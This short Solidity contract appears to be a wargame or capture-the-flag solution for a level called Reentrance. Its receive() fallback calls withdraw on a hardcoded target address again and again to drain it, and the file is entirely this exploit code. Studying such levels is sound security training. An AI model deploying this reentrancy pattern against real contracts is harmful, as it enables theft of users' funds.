// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import "../Levels/Reentrance.sol";

contract ReentranceAttack {
  Reentrance reentrance = Reentrance(0x524F04724632eED237cbA3c37272e018b3A7967e);
  uint public donation;

  constructor() public payable {
    donation = msg.value;
  }

  function withdraw() public {
    reentrance.withdraw(donation);
  }

  receive() external payable {
    reentrance.withdraw(donation);
  }
}
